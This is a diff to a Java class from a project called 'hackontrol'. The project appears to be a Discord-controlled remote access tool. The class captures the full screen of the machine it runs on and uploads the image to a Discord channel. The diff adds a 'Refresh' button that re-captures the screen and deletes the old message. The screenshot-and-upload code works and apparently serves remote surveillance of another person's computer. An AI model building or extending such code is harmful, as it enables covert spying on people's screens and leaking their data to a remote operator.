@@ -15,6 +15,7 @@ import com.khopan.hackontrol.manager.button.ButtonManager;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolButton;
 import com.khopan.hackontrol.utils.HackontrolError;
+import com.khopan.hackontrol.utils.HackontrolMessage;
 
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
@@ -25,6 +26,7 @@ public class ScreenshotChannel extends HackontrolChannel {
 	private static final String CHANNEL_NAME = "screenshot";
 
 	private static final Button BUTTON_SCREENSHOT = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Screenshot", "screenshot");
+	private static final Button BUTTON_REFRESH = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Refresh", "screenshotRefresh");
 
 	private Robot robot;
 
@@ -36,6 +38,7 @@ public class ScreenshotChannel extends HackontrolChannel {
 	@Override
 	public void preInitialize(Registry registry) {
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ScreenshotChannel.BUTTON_SCREENSHOT, this :: buttonScreenshot);
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ScreenshotChannel.BUTTON_REFRESH, this :: buttonRefresh);
 	}
 
 	@Override
@@ -52,11 +55,16 @@ public class ScreenshotChannel extends HackontrolChannel {
 			BufferedImage image = this.robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
 			ByteArrayOutputStream stream = new ByteArrayOutputStream();
 			ImageIO.write(image, "png", stream);
-			context.replyFiles(FileUpload.fromData(stream.toByteArray(), ScreenshotChannel.getScreenshotFileName())).addActionRow(ScreenshotChannel.BUTTON_SCREENSHOT, HackontrolButton.delete()).queue(ButtonManager :: dynamicButtonCallback);
+			context.replyFiles(FileUpload.fromData(stream.toByteArray(), ScreenshotChannel.getScreenshotFileName())).addActionRow(ScreenshotChannel.BUTTON_SCREENSHOT, ScreenshotChannel.BUTTON_REFRESH, HackontrolButton.delete()).queue(ButtonManager :: dynamicButtonCallback);
 		} catch(Throwable Errors) {
 			HackontrolError.throwable(context.reply(), Errors);
 			return;
 		}
+	}
+
+	private void buttonRefresh(ButtonContext context) {
+		this.buttonScreenshot(context);
+		HackontrolMessage.delete(context);
 	}
 
 	private static String getScreenshotFileName() {
